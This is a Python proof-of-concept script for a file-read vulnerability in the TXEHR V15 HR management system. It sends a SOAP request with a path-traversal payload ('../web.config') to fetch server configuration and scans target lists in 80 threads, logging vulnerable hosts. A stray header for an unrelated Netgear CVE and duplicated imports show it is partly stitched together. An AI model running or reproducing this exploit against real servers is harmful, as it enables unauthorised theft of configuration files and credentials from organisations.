# 同享人力资源管理系统-TXEHR V15 DownloadTemplate 文件读取漏洞
# body="/Assistant/Default.aspx"

# Netgear WN604 downloadFile.php 信息泄露漏洞(CVE-2024-6646)
# title=="Netgear"

import requests,argparse,sys,time,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def dinner():
    test = """
████████╗██╗  ██╗███████╗██╗  ██╗██████╗       ██╗   ██╗ ██╗███████╗
╚══██╔══╝╚██╗██╔╝██╔════╝██║  ██║██╔══██╗      ██║   ██║███║██╔════╝
   ██║    ╚███╔╝ █████╗  ███████║██████╔╝█████╗██║   ██║╚██║███████╗
   ██║    ██╔██╗ ██╔══╝  ██╔══██║██╔══██╗╚════╝╚██╗ ██╔╝ ██║╚════██║
   ██║   ██╔╝ ██╗███████╗██║  ██║██║  ██║       ╚████╔╝  ██║███████║
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝        ╚═══╝   ╚═╝╚══════╝
                                        --author:Kucei
                                        --Version:TXEHR_V15_DownloadTemplate-ReadFile 1.0.0
"""
    print(test)

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def main():
    dinner()
    parser = argparse.ArgumentParser(description="同享人力资源管理系统-TXEHR V15 DownloadTemplate 文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="Please Input URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="Please Input File")
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/Service/DownloadTemplate.asmx'
    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'Content-Length': 'length',
        'SOAPAction': '"http://tempuri.org/DownloadFile"'
    }
    data = '<?xml version="1.0" encoding="utf-8"?>\r\n<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n\r<soap:Body>\r\n\r\r<DownloadFile xmlns="http://tempuri.org/">\r\n\r\r\r<path>../web.config</path>\r\n\r\r</DownloadFile>\r\n\r</soap:Body>\r\n</soap:Envelope>'

    try :
        response = requests.post(url=target+url_payload,headers=headers,data=data,verify=False,timeout=5)
        # print(response.text)
        if response.status_code == 200 and 'DownloadFileResult' in response.text:
            print( f"[+] {target} 存在漏洞！ ")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()
